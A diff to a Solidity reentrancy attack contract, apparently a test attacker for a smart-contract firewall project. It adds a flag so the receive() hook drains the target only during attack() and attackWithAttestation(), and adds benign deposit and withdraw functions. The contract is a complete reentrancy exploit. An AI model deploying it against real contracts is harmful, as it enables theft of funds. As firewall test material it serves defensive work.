@@ -23,27 +23,48 @@ interface IFirewall {
 
 contract ReentrancyAttack {
     address public vulnerableContract;
+    // Boolean used so that `receive()` only
+    // reenters `ReentrancyVulnerable` when
+    // we are attacking it.
+    bool public benignWithdraw;
 
     error WithdrawFundsFailed(address recipient);
 
     constructor(address _vulnerableContract) {
         vulnerableContract = _vulnerableContract;
+        benignWithdraw = true;
     }
 
     receive() external payable {
-        while (vulnerableContract.balance > 0) {
-            IReentrancyVulnerable(vulnerableContract).withdraw();
+        if(!benignWithdraw) {
+            while (vulnerableContract.balance > 0) {
+                IReentrancyVulnerable(vulnerableContract).withdraw();
+            }
         }
+    }
+
+    function deposit() public payable {
+        require(msg.value >= 1 ether);
+        IReentrancyVulnerable(vulnerableContract).deposit{value: 1 ether}();
+    }
+
+    function withdraw() public payable {
+        benignWithdraw = true;
+        IReentrancyVulnerable(vulnerableContract).withdraw();
     }
 
     function attack() public payable {
         require(msg.value >= 1 ether);
+        benignWithdraw = false;
+
         IReentrancyVulnerable(vulnerableContract).deposit{value: 1 ether}();
         IReentrancyVulnerable(vulnerableContract).withdraw();
     }
 
     function attackWithAttestation(Attestation calldata attestation, bytes calldata attestationSignature) public payable {
         require(msg.value >= 1 ether);
+        benignWithdraw = false;
+
         IReentrancyVulnerable(vulnerableContract).deposit{value: 1 ether}();
         bytes memory data = abi.encodeWithSelector(IReentrancyVulnerable.withdraw.selector);
         IFirewall(vulnerableContract).attestedCall(attestation, attestationSignature, data);
@@ -51,6 +72,6 @@ contract ReentrancyAttack {
 
     function withdrawFunds() public {
         (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
-        if (!success) revert WithdrawFundsFailed(msg.sender);
+        require(success, "WithdrawFunds failed.");
     }
 }
